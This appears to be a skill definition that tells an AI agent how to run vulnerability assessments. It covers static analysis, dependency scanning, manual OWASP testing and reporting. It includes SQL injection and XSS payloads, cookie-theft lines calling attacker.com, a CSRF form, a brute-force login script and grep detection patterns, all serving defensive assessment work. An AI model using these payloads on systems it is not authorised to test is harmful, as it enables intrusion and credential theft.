---
name: vulnerability-assessment
description: |
  Perform comprehensive vulnerability scanning and assessment covering OWASP Top 10, static code
  analysis (SAST), dynamic testing, dependency vulnerabilities, and authentication/authorization
  flaws. Identify SQL injection, XSS, broken access control, insecure dependencies, CSRF, and
  other security vulnerabilities with proof-of-concept code and remediation guidance. Use when
  performing security scans, vulnerability assessments, penetration testing, security audits,
  finding vulnerabilities, or when user mentions vulnerability scan, security scan, OWASP scan,
  SQL injection, XSS, broken access control, dependency vulnerabilities, SAST, DAST, or CVE scan.
---

# Vulnerability Assessment

## Overview

This skill performs comprehensive vulnerability scanning and assessment covering the OWASP Top 10, static code analysis, dynamic testing, dependency vulnerabilities, and authentication/authorization bypass testing. It uses automated scanning tools (Bandit, ESLint security plugins, npm audit, pip-audit) combined with manual security analysis to identify exploitable vulnerabilities with concrete proof-of-concept code and remediation guidance.

## Output Location

**IMPORTANT - Default Output Location**: Unless otherwise specified by the user, save all output files and data generated by this skill to `~/Documents/claude-code-skills-data/vulnerability-assessment/` directory. Create the directory if it doesn't exist. This ensures consistent organization across all skills.

## Workflow

Follow this sequential process for comprehensive vulnerability assessment:

### 1. Preparation and Scope Definition

**Gather Information:**
- Source code files and languages
- Dependency manifests (package.json, requirements.txt, pom.xml, Gemfile, go.mod)
- Running application URL (for dynamic testing)
- API endpoint documentation (OpenAPI spec or endpoint list)
- Authentication mechanisms (OAuth2, JWT, session-based)
- Access credentials for testing (test accounts)

**Define Scope:**
- Which files/directories to scan?
- Which endpoints to test?
- Which authentication mechanisms to test?
- Out-of-scope areas (production data, destructive operations)

**Ask clarifying questions if information is missing:**
- What programming languages are used?
- Are dependency files available (package.json, requirements.txt)?
- Is there a running instance available for dynamic testing?
- What authentication method is used?
- Are there test credentials available?

### 2. Static Application Security Testing (SAST)

Run automated static analysis tools to find vulnerabilities in source code.

**For Python Projects:**

Run Bandit (Python security linter):
```bash
python scripts/run_bandit.py <path-to-python-code>
```

Common findings:
- Hardcoded passwords/secrets
- SQL injection (use of string formatting in queries)
- Command injection (use of shell=True, os.system)
- Insecure deserialization (pickle usage)
- Weak cryptography (MD5, SHA1, DES)

**For JavaScript/TypeScript Projects:**

Run ESLint with security plugins:
```bash
python scripts/run_eslint_security.py <path-to-js-code>
```

Common findings:
- XSS vulnerabilities (dangerouslySetInnerHTML, innerHTML)
- Eval usage
- Insecure randomness
- Prototype pollution
- Regex DoS (ReDoS)

**Manual Code Review Patterns:**

Search for security-sensitive patterns using grep:
```bash
# SQL injection patterns
grep -r "execute.*%s" . --include="*.py"
grep -r "query.*\+" . --include="*.js"

# Command injection patterns
grep -r "os.system\|subprocess.*shell=True" . --include="*.py"
grep -r "child_process.exec\|eval" . --include="*.js"

# Hardcoded secrets
grep -rE "(password|secret|api_key|token)\s*=\s*['\"]" . --include="*.py" --include="*.js"

# Insecure deserialization
grep -r "pickle.loads\|yaml.load\|eval" . --include="*.py"
```

**Filter False Positives:**
- Verify findings are in actual code paths (not comments or test files)
- Check if input is properly validated
- Confirm vulnerability is exploitable

### 3. Dependency Vulnerability Scanning

Scan dependencies for known CVEs using automated tools.

**For Node.js Projects:**
```bash
python scripts/scan_npm_dependencies.py <path-to-package.json>
```

**For Python Projects:**
```bash
python scripts/scan_python_dependencies.py <path-to-requirements.txt>
```

**Analyze Results:**
- **Critical/High severity:** Immediate remediation required
- **Medium severity:** Fix in next release
- **Low severity:** Fix when convenient
- Check if vulnerability is exploitable in your context
- Verify if dependency is actually used (not just installed)

**Example Output:**
```
CRITICAL: lodash 4.17.15 - Prototype Pollution (CVE-2020-8203)
  Affected versions: <4.17.19
  Fixed in: 4.17.19
  Recommendation: npm install lodash@4.17.19

HIGH: axios 0.19.0 - SSRF via URL parsing (CVE-2021-3749)
  Affected versions: <0.21.1
  Fixed in: 0.21.1
  Recommendation: npm install axios@0.21.1
```

### 4. Manual Vulnerability Testing

Test for common vulnerabilities through manual testing and analysis.

#### 4.1 SQL Injection Testing

**Test Approach:**
1. Identify input points (URL parameters, form fields, API requests)
2. Inject SQL payloads
3. Observe responses for errors or unexpected behavior

**Test Payloads:**
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
'; DROP TABLE users--
' AND 1=(SELECT COUNT(*) FROM users)--
```

**Testing Example:**
```bash
# Original request
GET /api/users?id=123

# SQL injection test
GET /api/users?id=123' OR '1'='1

# If vulnerable, might return all users instead of just user 123
```

**Proof-of-Concept (if vulnerable):**
```python
import requests

# Vulnerable endpoint
url = "https://api.example.com/users"
params = {"id": "123' OR '1'='1"}

response = requests.get(url, params=params)
print(response.json())  # Returns all users instead of just user 123
```

#### 4.2 Cross-Site Scripting (XSS) Testing

**Test Approach:**
1. Identify user input reflected in HTML
2. Inject XSS payloads
3. Check if payload executes

**Test Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
';alert('XSS');//
```

**Testing Example:**
```bash
# Test reflected XSS in search parameter
GET /search?q=<script>alert('XSS')</script>

# Test stored XSS in comment field
POST /api/comments
{
  "text": "<img src=x onerror=alert('XSS')>"
}
```

**Proof-of-Concept (if vulnerable):**
```javascript
// Vulnerable code (no sanitization)
const searchQuery = req.query.q;
res.send(`<h1>Search results for: ${searchQuery}</h1>`);

// Exploit
fetch('/search?q=<script>document.location="http://attacker.com/?cookie="+document.cookie</script>')
```

#### 4.3 Broken Access Control Testing

**Test Approach:**
1. Identify endpoints requiring authorization
2. Test with different user roles
3. Try to access other users' data

**IDOR (Insecure Direct Object Reference) Testing:**
```bash
# Logged in as User A (id=123)
GET /api/users/123/profile  # Should work

# Try to access User B (id=456)
GET /api/users/456/profile  # Should return 403, but might return data
```

**Privilege Escalation Testing:**
```bash
# Logged in as regular user
POST /api/admin/delete-user  # Should return 403
GET /admin  # Should return 403
```

**Proof-of-Concept (if vulnerable):**
```python
import requests

# User A's token
token_a = "eyJhbGc..."
headers = {"Authorization": f"Bearer {token_a}"}

# Try to access User B's data (id=456)
response = requests.get("https://api.example.com/users/456/profile", headers=headers)

if response.status_code == 200:
    print("VULNERABLE: User A can access User B's profile")
    print(response.json())
```

#### 4.4 Authentication Testing

**Test for:**
- Weak password policies (allow "password123")
- Missing account lockout (unlimited login attempts)
- Session fixation
- Token vulnerabilities (JWT algorithm confusion, missing expiration)
- Missing MFA

**Brute Force Testing:**
```python
import requests

url = "https://api.example.com/login"
passwords = ["password", "123456", "password123", "admin"]

for password in passwords:
    response = requests.post(url, json={"username": "admin", "password": password})
    if response.status_code == 200:
        print(f"SUCCESS: Password is {password}")
        break
    print(f"Failed: {password}")
```

**JWT Testing:**
```python
import jwt

# Decode JWT without verification to inspect claims
token = "eyJhbGc..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)

# Check for:
# - Missing 'exp' (expiration) claim
# - Long expiration (>1 hour for access tokens)
# - Sensitive data in payload
# - Weak signing algorithm (HS256 with guessable secret, "none" algorithm)
```

#### 4.5 CSRF Testing

**Test Approach:**
1. Identify state-changing operations (POST, PUT, DELETE)
2. Check for CSRF tokens
3. Attempt CSRF attack

**Testing Example:**
```html
<!-- Attacker's malicious page -->
<form action="https://victim.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**Vulnerable if:**
- No CSRF token required
- CSRF token in response but not validated
- Relies only on cookies for authentication (no custom headers)

### 5. Dynamic Application Security Testing (DAST)

Test running application for vulnerabilities.

**Test Categories:**
- **Input validation:** Send malformed data, extremely long strings, special characters
- **Error handling:** Trigger errors, observe error messages for information disclosure
- **Session management:** Session fixation, session hijacking, concurrent sessions
- **Business logic:** Test workflows for logic flaws

**Example Tests:**
```bash
# Test input validation
POST /api/users
{
  "age": -1,  # Negative age
  "email": "not-an-email",  # Invalid email
  "name": "A" * 10000  # Extremely long name
}

# Test error handling
GET /api/users/invalid-id
# Check if error reveals stack traces or database details

# Test rate limiting
for i in {1..1000}; do
  curl https://api.example.com/expensive-endpoint
done
```

### 6. Configuration Review

Review security configurations for common misconfigurations.

**Check for:**
- Default credentials (admin/admin, root/root)
- Verbose error messages in production
- Directory listing enabled
- Exposed admin panels (/admin, /phpmyadmin)
- Missing security headers
- Weak TLS configuration
- Exposed sensitive files (.env, .git, config.json)

**Automated Check:**
```bash
python scripts/check_security_config.py <url>
```

**Manual Checks:**
```bash
# Check for exposed files
curl https://example.com/.env
curl https://example.com/.git/config
curl https://example.com/config.json

# Check security headers
curl -I https://example.com
# Look for: HSTS, X-Content-Type-Options, X-Frame-Options, CSP

# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 example.com
```

### 7. Documentation and Reporting

Create comprehensive vulnerability report with findings, PoCs, and remediation.

**Deliverable 1: Vulnerability Report** (`vulnerability_report.md`)

Structure:
```markdown
# Vulnerability Assessment Report

## Executive Summary
- Total vulnerabilities: 23
- Critical: 2
- High: 5
- Medium: 10
- Low: 6
- Overall risk level: HIGH

## Findings

### [CRITICAL] SQL Injection in Login Endpoint

**Severity:** Critical (CVSS: 9.8)
**Location:** `/api/auth/login` (line 45 in auth.py)
**CWE:** CWE-89 (SQL Injection)

**Description:**
The login endpoint is vulnerable to SQL injection due to unsanitized user input being directly interpolated into SQL queries.

**Proof-of-Concept:**
```python
import requests

url = "https://api.example.com/auth/login"
payload = {
    "username": "admin' OR '1'='1",
    "password": "anything"
}

response = requests.post(url, json=payload)
print(response.json())  # Returns auth token, bypassing authentication
```

**Vulnerable Code:**
```python
# auth.py:45
def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = db.execute(query)  # VULNERABLE
    return result
```

**Impact:**
- Authentication bypass
- Unauthorized data access
- Potential data modification/deletion
- Complete database compromise

**Remediation:**
```python
# Use parameterized queries
def login(username, password):
    query = "SELECT * FROM users WHERE username=? AND password=?"
    result = db.execute(query, (username, password))  # SAFE
    return result
```

**References:**
- OWASP A03:2021 - Injection
- CWE-89: SQL Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

---

### [HIGH] Stored Cross-Site Scripting (XSS) in Comments

**Severity:** High (CVSS: 7.1)
**Location:** `/api/comments` (line 78 in comments.py)
**CWE:** CWE-79 (Cross-Site Scripting)

**Description:**
User comments are stored without sanitization and rendered without encoding, allowing attackers to inject malicious JavaScript.

**Proof-of-Concept:**
```javascript
// 1. Post malicious comment
fetch('/api/comments', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    text: '<img src=x onerror="fetch(\'https://attacker.com?cookie=\'+document.cookie)">'
  })
});

// 2. When victim views comments, their cookies are stolen
```

**Impact:**
- Session hijacking (cookie theft)
- Account takeover
- Malware distribution
- Phishing attacks

**Remediation:**
```javascript
// Sanitize input before storing
const sanitizeHtml = require('sanitize-html');

app.post('/api/comments', (req, res) => {
  const sanitized = sanitizeHtml(req.body.text, {
    allowedTags: [],  // No HTML tags allowed
    allowedAttributes: {}
  });

  db.saveComment(sanitized);
  res.json({success: true});
});

// AND/OR encode output when rendering
<div>{escapeHtml(comment.text)}</div>
```

**References:**
- OWASP A03:2021 - Injection
- CWE-79: Cross-Site Scripting
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

[Continue for all findings...]
```

**Deliverable 2: Vulnerability Matrix** (`vulnerability_matrix.csv`)

| ID | Title | Severity | CVSS | Location | CWE | Status | Owner | Target Date |
|----|-------|----------|------|----------|-----|--------|-------|-------------|
| V-001 | SQL Injection in Login | Critical | 9.8 | auth.py:45 | CWE-89 | Open | Backend Team | 2024-02-15 |
| V-002 | XSS in Comments | High | 7.1 | comments.py:78 | CWE-79 | Open | Frontend Team | 2024-02-20 |
| V-003 | IDOR in User Profiles | High | 7.5 | users.py:123 | CWE-639 | Open | Backend Team | 2024-02-20 |

**Deliverable 3: Remediation Tracker** (`remediation_tracker.md`)

Checklist format:
```markdown
# Vulnerability Remediation Tracker

## Critical Priority (Fix Immediately)
- [ ] V-001: SQL Injection in Login (CVSS: 9.8)
  - Assigned: Backend Team
  - Target: 2024-02-15
  - Status: In Progress

## High Priority (Fix in Next Sprint)
- [ ] V-002: XSS in Comments (CVSS: 7.1)
- [ ] V-003: IDOR in User Profiles (CVSS: 7.5)
- [ ] V-004: Missing Authentication on Admin Endpoint (CVSS: 8.2)
- [ ] V-005: Insecure JWT Implementation (CVSS: 7.8)

## Medium Priority
[List of medium priority vulnerabilities]

## Low Priority
[List of low priority vulnerabilities]
```

### 8. Risk Prioritization with CVSS

Calculate CVSS v3.1 scores for each vulnerability to prioritize remediation.

**CVSS Calculator:** Use https://www.first.org/cvss/calculator/3.1

**Example Calculation for SQL Injection:**
- **Attack Vector (AV):** Network (N)
- **Attack Complexity (AC):** Low (L)
- **Privileges Required (PR):** None (N)
- **User Interaction (UI):** None (N)
- **Scope (S):** Unchanged (U)
- **Confidentiality (C):** High (H)
- **Integrity (I):** High (H)
- **Availability (A):** High (H)

**CVSS Score:** 9.8 (Critical)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Prioritization Matrix:**

| CVSS Score | Severity | Time to Fix |
|------------|----------|-------------|
| 9.0 - 10.0 | Critical | Immediate (24-48 hours) |
| 7.0 - 8.9 | High | Next sprint (1-2 weeks) |
| 4.0 - 6.9 | Medium | Next release (1 month) |
| 0.1 - 3.9 | Low | When convenient (3+ months) |

### 9. Quality Validation

Before finalizing the vulnerability assessment, verify completeness:

**Validation Checklist:**
- [ ] All OWASP Top 10 categories tested
- [ ] Static analysis tools run (Bandit, ESLint)
- [ ] Dependency scanning completed
- [ ] Manual testing performed on key endpoints
- [ ] All findings verified (no false positives)
- [ ] Proof-of-concept provided for each vulnerability
- [ ] CVSS scores calculated for all findings
- [ ] Remediation guidance provided with code examples
- [ ] CWE/CVE references included
- [ ] Impact analysis completed
- [ ] Remediation tracker created

**If any checklist item is unchecked, complete it before finalizing report.**

## Scanning Scripts

This skill includes automated scanning scripts:

- **[scripts/run_bandit.py](scripts/run_bandit.py)** - Run Bandit Python security linter
- **[scripts/run_eslint_security.py](scripts/run_eslint_security.py)** - Run ESLint with security plugins
- **[scripts/scan_npm_dependencies.py](scripts/scan_npm_dependencies.py)** - Scan npm dependencies for CVEs
- **[scripts/scan_python_dependencies.py](scripts/scan_python_dependencies.py)** - Scan Python dependencies for CVEs
- **[scripts/check_security_config.py](scripts/check_security_config.py)** - Check security configuration and headers

## Reference Documentation

This skill includes comprehensive reference documentation:

- **[OWASP_TOP_10.md](references/OWASP_TOP_10.md)** - Detailed OWASP Top 10 vulnerabilities with examples
- **[CWE_REFERENCE.md](references/CWE_REFERENCE.md)** - Common CWE categories and descriptions
- **[REMEDIATION_GUIDE.md](references/REMEDIATION_GUIDE.md)** - Language-specific remediation patterns
- **[CVSS_SCORING.md](references/CVSS_SCORING.md)** - CVSS v3.1 scoring methodology

Refer to these files for detailed vulnerability information and remediation guidance.

## Common Vulnerability Patterns

**SQL Injection:**
- String concatenation in queries
- User input directly in SQL
- ORM misuse (raw queries)

**XSS:**
- Unescaped user input in HTML
- `dangerouslySetInnerHTML` in React
- `innerHTML` in JavaScript

**Broken Access Control:**
- Missing authorization checks
- User-supplied IDs without verification
- Horizontal privilege escalation (IDOR)

**Insecure Deserialization:**
- Pickle in Python
- `eval()` or `unserialize()` on user input
- YAML load with unsafe loader

**Security Misconfiguration:**
- Default credentials
- Verbose error messages
- Missing security headers
- Directory listing enabled

## Best Practices

1. **Verify Before Reporting:** Confirm vulnerabilities are exploitable
2. **Provide PoC:** Include working proof-of-concept code
3. **Calculate CVSS:** Use official CVSS calculator for scores
4. **Give Context:** Explain impact in business terms
5. **Offer Solutions:** Provide specific remediation code
6. **Prioritize:** Focus on critical/high severity first
7. **No False Positives:** Filter out non-issues
8. **Document Everything:** Complete findings with references
